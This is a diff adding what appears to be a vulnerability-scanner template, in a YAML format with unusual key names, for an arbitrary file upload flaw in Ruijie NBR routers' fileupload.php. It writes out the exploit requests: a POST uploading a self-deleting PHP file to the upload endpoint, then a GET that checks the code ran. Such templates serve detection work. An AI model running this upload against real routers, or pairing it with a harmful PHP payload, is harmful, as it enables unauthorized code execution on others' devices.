@@ -1,0 +1,34 @@
+id: ruijie-nbr-fileupload
+brief:
+    title: Ruijie NBR fileupload.php - Arbitrary File Upload
+    by: SleepingBag945
+    level: critical
+    about: Ruijie NBR router fileupload.php file has an arbitrary file upload vulnerability. An attacker can upload any file to the server through the vulnerability to obtain server permissions.
+    label:
+        - ruijie
+        - fileupload
+        - intrusive
+        - nbr
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/ddi/server/fileupload.php?uploadDir=upload&name={{filename}}.php'
+      head:
+        Accept: text/plain, */*; q=0.01
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.php"
+        Content-Type: image/jpeg
+      body: <?php echo md5("{{string}}");unlink(__FILE__);?>
+      signs:
+        - "on": word
+          has:
+            - '{{md5(string)}}'
+          in: body_2
+    - verb: GET
+      to:
+        - '{{BaseURL}}/ddi/server/upload/{{filename}}.php'
+      signs:
+        - "on": word
+          has:
+            - '{{md5(string)}}'
+          in: body_2
